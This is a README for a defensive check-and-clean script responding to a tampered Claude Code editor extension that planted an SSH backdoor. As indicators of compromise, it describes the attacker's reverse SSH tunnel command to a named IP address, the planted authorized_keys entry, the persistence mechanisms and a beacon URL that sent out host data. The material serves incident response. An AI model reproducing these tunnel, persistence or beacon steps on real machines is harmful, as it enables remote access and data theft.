# Claude Code extension SSH backdoor (Cursor marketplace)

Part of the [PrivacySafe Security Patches](../README.md) collection.

<a name="claude-code-extension-ssh-backdoor"></a>

## Claude Code Extension SSH Backdoor

**Script:** [`claude-code-vsx/claude-code-vsx-oct2026-check.sh`](claude-code-vsx-oct2026-check.sh)

On 29 October 2026 a maliciously modified copy of the Claude Code extension for VS Code was served from the Cursor extension marketplace. [Cursor's notice](https://cursor.com/blog/claude-code-extension-security-notice) names versions 2.1.312 and 2.1.313 and a window of about 2:27am to 1:35pm Pacific time. Cursor says up to 5,000 machines were affected. Anthropic says it was not involved in building, publishing or hosting the tampered build. The code added to `extension.js` runs as soon as the editor loads the extension, with no action from the user.

| | |
|---|---|
| CVE | None (a supply-chain compromise of an editor extension) |
| Affected | Claude Code extension **2.1.313**, and the copy of **2.1.312** that Cursor's marketplace served, between about 2:27am and 1:35pm Pacific on 29 October 2026. Cursor lists the macOS and Windows builds. The script judges every platform by content |
| Not affected | The legitimate 2.1.312 on npm and Open VSX (published 27 October), and 2.1.314 and newer |
| Fixed | **Nothing to patch.** A replacement 2.1.314 was published on 30 October, but updating or uninstalling the extension leaves the backdoor in place |
| Attacker server | Cursor says it has been taken offline |

### Get the vendor's fix first, then clean

Two things have to happen, and neither replaces the other:

1. Install the vendor's fix. Anthropic replaced the bad build with **Claude Code 2.1.314** on 30 October 2026. 2.1.314 or newer is the fix. Install it from your editor's Extensions view, or let the script do it with `update`. Every run of `check`, `hunt`, `clean` and `update` says this up front (silence it with `NO_NOTICE=1`).
2. Remove what the backdoor already planted. Updating swaps the extension's files and leaves the attacker's SSH key, the implant files and the persistence in place. `clean` removes them, and you then rotate credentials from a trusted machine.

`update` does the first part **with questions first**: it runs a read-only check and shows you the state of the machine. For each editor command line (`code`, `cursor`, `codium`, `windsurf`) whose extensions folder holds Claude Code it shows the exact command and asks before running it (Enter accepts the recommended answer, yes) (`<editor> --install-extension anthropic.claude-code --force`; the editor downloads the extension from its own marketplace, the script downloads nothing). It checks again and says whether 2.1.314 or newer is now installed, and if the machine shows the backdoor it asks whether to run `clean` now. An editor that does not have the extension is never offered one, and as root it checks but does not install, because editors belong to a user. It needs a terminal to ask on, or `--yes` to install without asking. `--yes` never answers the clean question, which needs an answer at the terminal or `--and-clean`. If the terminal gives no answer at all, the answer is no.

```bash
./claude-code-vsx-oct2026-check.sh update --dry-run     # show the commands, run none
./claude-code-vsx-oct2026-check.sh update               # check, ask, install, check again, offer clean
```

Run in a real terminal on GNU/Linux, Enter installs and `n` skips. On a machine with the backdoor Enter then Enter installs the vendor's build and cleans, while Enter then `n` installs and leaves it uncleaned. With no terminal and no `--yes` it refuses.

Cursor publishes remediation scripts for macOS and Windows only. It publishes none for GNU/Linux, where `update`, `check` and `clean` here cover the same ground.

### What the backdoor leaves behind

The extension is only the delivery vehicle. On loading it:

- appends the attacker's ed25519 key, comment `svc-telemetry`, to `~/.ssh/authorized_keys`;
- writes `~/.config/.smt` (a retry loop) and `~/.config/.smtk` (the tunnel key), plus a copy of the tunnel key named `.stk_` and ten hex characters in the temp folder;
- opens a reverse SSH tunnel (`ssh -N -R '*:0:localhost:22'`) to `tunnel@134.209.82.225` and retries about every 60 seconds, kept alive by a LaunchAgent named `com.apple.sysmond.plist` on macOS, an `@reboot` crontab line on GNU/Linux, or a scheduled task named `SysMon` on Windows;
- tries to switch the local SSH server on, which Cursor says fails on most machines because it needs administrator rights;
- sends the host name, user name, operating system, public IP address, git email and the **names** (not the values) of environment variables that look like secrets to `http://134.209.82.225:8099/beacon`.

Because all of that lives outside the extension, an update does not clean it. Every piece needs its own check, which is what this script does.

### Platform coverage: macOS and GNU/Linux

| Platform | What Cursor's notice provides | What this tool provides |
|---|---|---|
| macOS | A one-line `grep` for the key, and `remediate-macos.sh` (run as the affected user, not as root) | `check`, `hunt`, `clean` and `block` (it prints the `pf` command on macOS), run as yourself or as root for every account. Covers the `com.apple.sysmond` LaunchAgent (and a loaded launchd job), `$TMPDIR` and `/private/var/folders` key copies, the Code, Cursor, VSCodium and Windsurf package caches under `Library/Application Support`, and a `log show` search for the key |
| GNU/Linux | The indicators (`/tmp/.stk_*`, the `@reboot` cron line) but **no check or remediation script**: the notice names macOS and Windows | `check`, `hunt`, `clean` and `block` (nftables or iptables). Covers the crontab line (removing it, or the whole crontab if it becomes empty), `.vscode`, `.cursor`, `.vscode-server`, `.cursor-server`, code-server, openvscode-server and Theia folders, the `auth.log`, `secure` and systemd journal hunt, and every account when run as root |
| Windows | A PowerShell check and `remediate-windows.ps1` | Not covered. Use Cursor's script |

What this adds beyond a `grep` for the word `svc-telemetry`: the key is matched by its key text and by both fingerprints as well as by its comment, so a key whose comment was changed is still found. Every other key in `authorized_keys` is listed so an unknown one stands out. 2.1.312 is judged by the content of `extension.js`, because a legitimate 2.1.312 exists. The check is read-only, `hunt` looks for evidence of a login, and `clean` moves files into a backup folder with a manifest instead of deleting them.

Cursor's macOS script is a vendor tool and a good first choice if you want the vendor's own cleanup. Cursor documents that it removes the malicious extension, the persistence, the running tunnel processes and the attacker's key, and exits non-zero if anything remains. This tool is open (CC0), works on both platforms, and is meant to be read before it is run.

macOS: the LaunchAgent and launchd persistence checks, the `$TMPDIR` key copies and the macOS `block` instructions follow the vendors' published macOS indicators. `check` changes nothing, so start there.

### Claude Code extension quick start

1. Download the script. The repository is mirrored on GitHub and Codeberg; pick a base URL.

   ```bash
   # BASE from GitHub:   https://raw.githubusercontent.com/PrivacySafe/security-patches/refs/heads/main
   # BASE from Codeberg: https://codeberg.org/PrivacySafe/security-patches/raw/branch/main
   # curl -fLO "$BASE/claude-code-vsx/claude-code-vsx-oct2026-check.sh"
   curl -fLO https://raw.githubusercontent.com/PrivacySafe/security-patches/refs/heads/main/claude-code-vsx/claude-code-vsx-oct2026-check.sh
   ```

2. Read it before running it, then make it executable.

   ```bash
   less claude-code-vsx-oct2026-check.sh
   chmod +x claude-code-vsx-oct2026-check.sh
   ```

3. Check your account (as yourself), or every account on the machine (as root).

   ```bash
   ./claude-code-vsx-oct2026-check.sh check
   sudo ./claude-code-vsx-oct2026-check.sh check
   ```

4. If it reports anything, close the editor, look for a login with the attacker's key, then clean.

   ```bash
   ./claude-code-vsx-oct2026-check.sh hunt
   ./claude-code-vsx-oct2026-check.sh clean --dry-run
   ./claude-code-vsx-oct2026-check.sh clean --reinstall
   ```

5. Optional, on GNU/Linux as root: drop outbound traffic to the attacker's address.

   ```bash
   sudo ./claude-code-vsx-oct2026-check.sh block
   ```

### Claude Code extension commands

| Command | What it does |
|---|---|
| `check` (default) | Read-only. Looks for an installed Claude Code extension that is 2.1.313 or carries the backdoored `extension.js` (the known SHA-256, the attacker's address or the `svc-telemetry` comment); a downloaded or cached package with a known bad hash; the attacker's key in `authorized_keys` and `authorized_keys2`, matched by key, by fingerprint and by comment, with a list of every other key so an unfamiliar one stands out; the implant files; the crontab line or LaunchAgent; running tunnel processes; a connection to the attacker's address; and whether an SSH server answers on `127.0.0.1`, which is the door the tunnel opens. Exits `0` if nothing is found, `1` if an exposure or compromise is found, `2` if something could not be read |
| `hunt` | Read-only. Searches the SSH server logs (`/var/log/auth.log`, `/var/log/secure`, rotated `.gz` files, the systemd journal, and the macOS unified log) for a login with the attacker's key, which arrives from `127.0.0.1` or `::1`, and lists recent changes under `~/.ssh`, `~/.config` and the LaunchAgents folder. Exits `0` if no login evidence is found, `1` if some is |
| `update [--yes] [--and-clean] [--dry-run]` | The vendor's fix, with questions first (see above): check, then ask before installing Claude Code through each editor that has it, check again, then offer `clean` if the backdoor is found. Does not remove the backdoor by itself |
| `keys` | Read-only. Lists the private keys in each account's `~/.ssh` (type, fingerprint, last change, passphrase-protected or not, and the `Host` entries in `~/.ssh/config` that use each key, so you know where the new key has to go) without printing key material, and counts the agent sockets in `~/.ssh/agent`. Nothing is blocked or copied |
| `clean` | Stops the tunnel processes, unloads and removes the persistence, removes the attacker's key line from `authorized_keys` (keeping a backup and the file's owner and mode), and moves the implant files and the bad extension folders into a backup folder. Nothing is deleted. `--reinstall` then installs the extension again through any editor command line it finds (`code`, `cursor`, `codium`, `windsurf`). `--dry-run` shows the plan. Re-checks afterwards and exits `1` if anything remains |
| `block` | GNU/Linux, as root. Drops outbound traffic to `134.209.82.225` with nftables or iptables. On macOS it prints the `pf` command instead. `--dry-run` shows the command |
| `unblock` | Removes the rule that `block` added. Verified with nftables and with iptables: with the address made local, connections to it were dropped after `block`, other destinations were unaffected, and `unblock` restored them |
| `version` | Prints the script version. Every command prints it on its first line too |

### SSH keys and the agent folder

`~/.ssh/agent` is not where keys are stored. OpenSSH 10.1 and later put the `ssh-agent` socket there, including the sockets sshd makes for forwarded agents. Older versions use `/tmp`. The keys an agent holds are in its memory, and the key files you made with `ssh-keygen` stay in `~/.ssh`. There is nothing in the agent folder to block or copy, and locking it would only break `ssh-agent`. OpenSSH made the change so that programs restricted to `/tmp` cannot use your agent.

What a program that can read your files can take is the private key files, and a file that no passphrase protects can be used at once. `keys` lists each private key in `~/.ssh` (type, fingerprint, last change, whether a passphrase protects it) without printing any key material, and counts the sockets in `~/.ssh/agent`.

If this machine may have been hit, the order is:

1. Record first. Before `clean` changes anything it saves a record of each account's `~/.ssh` in its backup folder: `authorized_keys`, `config` and `known_hosts` with their times, the key inventory, and the socket names. Private keys are not copied unless you add `--copy-keys`: a copy is one more thing to steal, and `clean` never changes a private key. If you do copy them, delete the copy after you have rotated the keys.
2. Contain. `clean` stops the tunnel and its retry loop, removes the persistence and the attacker's key. `--drop-agent-keys` also empties your own ssh-agents (`ssh-add -D`). You add the keys again afterwards. It does not help against key files that were already copied.
3. Check the keys and rotate. Run `keys`. For each key without a passphrase that something on this machine could have read, make a new key, add the new public key where the old one was accepted, remove the old one there, and delete the old file. Do this from a machine you trust. `ssh-keygen -p -f FILE` adds a passphrase to a file from now on. It does not undo a copy already taken.

Verified with OpenSSH 10.1p1 built from source: the agent socket is created in `~/.ssh/agent` (a folder with mode 0700, the socket 0600), `keys` counts it and still lists the keys, `hunt` explains the folder, `clean --drop-agent-keys` emptied the agent, and `ssh-agent -T` keeps the old `/tmp` location.

The same applies to the editor and assistant flaws reported on 29 October 2026, where a single local file could read the rest of the disk: unprotected key files were among what was taken.

### Before you run it

- Updating is the vendor's fix, not the cleanup. `update` installs Claude Code 2.1.314 or newer after asking. It does not remove the backdoor.
- Updating or uninstalling is not enough. The key, the scripts and the persistence stay behind. Run `check` even if you have already updated.
- Version 2.1.312 is judged by content, not by number. A legitimate 2.1.312 is on npm and Open VSX. Only the copy served by Cursor's marketplace was modified, so a 2.1.312 whose `extension.js` has none of the indicators is reported as informational. 2.1.313 was never published legitimately anywhere and is reported on sight.
- A backdoored extension on disk is "exposed", and the backdoor's own files are "compromised". If only the extension is found, it may never have been loaded, or it may already have been cleaned. If the key, the scripts, a tunnel process or a login is found, treat the account as compromised.
- The SSH-enable step usually failed, so a login was usually not possible. Cursor says that on most macOS and Windows machines the attacker could not have logged in through the tunnel, but the key, the persistence and the host report were still sent and planted. `check` says whether an SSH server answers on `127.0.0.1`, and `hunt` looks for an actual login. Neither proves that nobody logged in: logs rotate, and a quiet SSH `LogLevel` records no fingerprint.
- Rotate credentials from a different, trusted machine. The host report carried the names of secret-looking environment variables, so rotate anything in variables named like `KEY`, `TOKEN`, `SECRET`, `PASS`, `AWS` or `GCP`, plus everything else the account could reach, and review recent activity on those services. If `hunt` finds a login, consider rebuilding the machine.
- `clean` moves files, it does not delete them. Everything goes to a backup folder (`~/claude-code-vsx-oct2026-backup` for a normal user, `/var/backups/claude-code-vsx-oct2026` for root, mode `0700`) with a manifest. That also changes the evidence on disk. On a managed machine, take a snapshot or image first and follow your incident-response process.
- Close the editor before `clean`. An open editor can load the extension again. `--reinstall` installs it through the editor's command line, needs the network, and refuses to run as root. After it, restart the editor and confirm the version is 2.1.314 or newer.
- The installer is reported to be able to wipe an existing crontab. If your crontab is empty and you did not empty it, the backdoor may have done it. `clean` saves the crontab as it found it, but it cannot recover one that was already wiped.
- `block` is defense in depth. Cursor says the attacker's server is offline, so this matters only if it comes back on the same address. The rule does not survive a reboot, and it blocks one address, not the campaign.
- A user's own reverse tunnel is left alone. A process is stopped only if its command line names the attacker's address, the `.stk_` or `.smtk` key files, or the `.config/.smt` loop. A file named like an implant but without its content is listed for review and is not touched.
- Only Claude Code extension folders are examined. Other extensions are not read, so a different extension altered by the same actor would not be found by name. The key, file, process and network checks are not tied to one extension.
- A clean result means the published indicators were not found. Cursor updated its indicators on 30 October. One other write-up lists a different `darwin-arm64` package hash for 2.1.313 without calling it modified. That hash is not used. Add indicators as vendors publish them with `EXTRA_KEY_BLOBS`, `EXTRA_FPRS` and `EXTRA_SHA256`.
- Windows is not covered. Use the PowerShell remediation script in Cursor's notice, which also removes the `SysMon` task and the Startup-folder script. The osquery and Microsoft Defender queries in the references below can hunt across a fleet.
- macOS. The script works with bash 3.2, which is what macOS ships, and follows the vendors' macOS file layout.
- Run as root to check every account. As a normal user it checks only your own account. Files other users own cannot be read, and the script says so and exits `2` instead of reporting clean.

### References

- [Cursor: security notice](https://cursor.com/blog/claude-code-extension-security-notice) (29 October 2026, updated 30 October): versions, window, indicators, remediation scripts for macOS and Windows.
- [Phorion: Official Claude Code Extension Compromise](https://phorion.io/blog/offical-claude-code-vsx-compromise/): the first analysis, with the full behavior of the payload on macOS, GNU/Linux and Windows.
- [Socket: Cursor removes malicious Claude Code 2.1.313 extension](https://socket.dev/blog/claude-code-extension-compromise): registry records showing 2.1.313 was never published to npm or Open VSX, and that a legitimate 2.1.312 exists.
- [DoublePulsar: Anthropic hacked via Cursor to deliver remote access trojan](https://doublepulsar.com/anthropic-hacked-to-deliver-remote-access-trojan-to-claude-developer-laptops-worldwide-1148a92baae2): the replacement build does not remove the backdoor. Microsoft Defender for Endpoint hunting queries.

---
- [OpenSSH 10.1 release notes](https://www.openssh.com/txt/release-10.1): agent sockets move from `/tmp` to `~/.ssh/agent`, and why
- [Help Net Security: researchers broke the browsers built into VS Code, Cursor, Copilot, Codex and Claude Desktop](https://www.helpnetsecurity.com/2026/10/29/research-ai-assistant-browser-vulnerabilities/) (29 October 2026)

---

## ⚠️ Important notice

These scripts are used on our production systems and undergo testing, but they may require adaptation for other environments. Review the source code before running any script, test changes in a non-production environment where possible, and maintain current backups. This software is provided without warranty.

## 🏛️ Support PrivacySafe Foundation

[PrivacySafe Foundation](https://privacysafe.foundation) is a 501(c)(3) nonprofit public charity supporting Free/Libre and Open Source Software (FLOSS), cybersecurity education, decentralized technology, documentation, standards work, and public-interest privacy and security research.

Security work doesn't stop when a disclosure drops at midnight. If this repository helped you protect your users, please help us keep doing it:

* **[Donate directly to the Foundation](https://privacysafe.foundation)**
* [Open Collective](https://opencollective.com/privacysafe)
* [Ko-fi](https://ko-fi.com/R6R1194HN7)
* [Liberapay](https://liberapay.com/PrivacySafe/donate)

The Foundation website provides options for card donations, PayPal/Venmo, cryptocurrency, checks, and other forms of support. Donations are often tax-deductible in the USA. Federal EIN: 41-5237617.

## 🤝 Contributing

Found a bug in a script, or have a mitigation that belongs here? Please fork and submit a focused pull request.

⚠️ **Do not report unpatched vulnerabilities in a public issue.** Follow our [security policy](../SECURITY.md) instead. Never send sensitive information through ordinary direct messages or unencrypted email.

- **Contribution terms:** [`CONTRIBUTING.md`](../CONTRIBUTING.md)
- **Code of Conduct:** [`CODE_OF_CONDUCT.md`](../CODE_OF_CONDUCT.md)
- **AI Contribution Policy:** [`AI_POLICY.md`](../AI_POLICY.md)
- **Security and vulnerability reporting:** [`SECURITY.md`](../SECURITY.md)

## 🔐 More from PrivacySafe

* **[PrivacySafe](https://privacysafe.app):** Privacy-by-design software for home, teams, and organizations. Sign up free, no phone number required.
* **[Bits On Tape](https://bitsontape.com):** Our newsletter covering cybersecurity, privacy, FLOSS, AI, and digital culture.
* **[Ivy Cyber](https://ivycyber.com):** Hosting, enterprise deployment, training, and technical support, including help hardening your own infrastructure.

## ⚖️ License

<a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="nofollow"><img src="https://licensebuttons.net/p/zero/1.0/88x31.png" alt="CC0" /></a>

Security patches belong to everyone. To the extent possible under law, <a href="https://ivycyber.com" rel="nofollow">Ivy Cyber LLC</a> has waived all copyright and related or neighboring rights to this repository, including its scripts and documentation, under the <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="nofollow">Creative Commons CC0 1.0 Universal Public Domain Dedication</a> (`CC0-1.0`). Feel free to copy, remix, and share. If you'd like to give back, please [donate to PrivacySafe Foundation](https://privacysafe.foundation) 501c3 nonprofit.

See [`NOTICE`](../NOTICE) and [`LICENSE`](../LICENSE). Third-party components retain their original copyrights and licenses.

CC0 does not waive trademark or patent rights. PrivacySafe® and 3NWeb® are registered trademarks. PrivacySafe Foundation™ and Ivy Cyber™ are pending trademarks. This dedication does not grant permission to use these marks in a manner that suggests sponsorship, endorsement, affiliation, or origin.
